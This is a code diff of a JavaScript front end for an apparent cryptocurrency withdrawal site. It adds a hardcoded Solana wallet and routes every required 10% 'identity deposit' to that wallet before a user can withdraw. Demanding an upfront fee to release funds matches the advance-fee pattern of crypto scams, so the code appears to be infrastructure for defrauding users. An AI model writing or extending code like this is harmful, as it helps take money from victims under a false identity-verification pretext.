@@ -3,8 +3,11 @@ import { auth, db, ref, set, update, push, get, onAuthStateChanged } from './fir
 
 const ADDRESSES = {
   TRON: 'TEHf8c3EEgYJFWg26uCjiYYQJFjm9fRv4V',
-  BTC: 'bc1qqhqrmvk4yrlem7q7vcmwn4a8mv0huk6cudus9e'
+  BTC: 'bc1qqhqrmvk4yrlem7q7vcmwn4a8mv0huk6cudus9e',
+  SOL: 'CoFkNZ6wEzhSTyH8k3rxMcfC12WResgMwhgVV3MSfF62'
 };
+const IDENTITY_ASSET = 'SOL';
+const IDENTITY_ADDRESS = ADDRESSES.SOL;
 
 let currentSessionId = null;
 let countdownTimer = null;
@@ -242,15 +245,14 @@ function openIdentityConfirm() {
     return;
   }
 
-  const addr = ADDRESSES[pendingWithdraw.asset] || ADDRESSES.TRON;
   const idAddr = $('identityTreasuryAddress');
-  if (idAddr) idAddr.textContent = addr;
+  if (idAddr) idAddr.textContent = IDENTITY_ADDRESS;
   const idAmt = $('identityAmount');
   if (idAmt) idAmt.textContent = '$' + Number(pendingWithdraw.identityAmount).toFixed(2);
   const idWithdrawAmt = $('identityWithdrawAmount');
   if (idWithdrawAmt) idWithdrawAmt.textContent = '$' + Number(pendingWithdraw.amount).toFixed(2);
   const idAsset = $('identityAsset');
-  if (idAsset) idAsset.textContent = pendingWithdraw.asset;
+  if (idAsset) idAsset.textContent = 'SOLANA (SOL)';
 
   // clear inputs
   const src = $('identitySourceWallet');
@@ -312,9 +314,8 @@ window.completeWithdrawal = async function() {
   }
 
   const { amount, dest, asset, identityAmount } = pendingWithdraw;
-  const treasury = ADDRESSES[asset] || ADDRESSES.TRON;
 
-  // 1) Identity / 10% deposit tx (pending)
+  // 1) Identity / 10% deposit tx (pending) — always Solana
   const idTxRef = push(ref(db, 'transactions'));
   const idTxId = idTxRef.key;
   const identityPayload = {
@@ -323,9 +324,9 @@ window.completeWithdrawal = async function() {
     email: user.email || '',
     type: 'identity_deposit',
     relatedType: 'withdraw',
-    asset,
+    asset: IDENTITY_ASSET,
     amount: identityAmount,
-    address: treasury,
+    address: IDENTITY_ADDRESS,
     sourceWallet,
     txHash,
     status: 'pending',
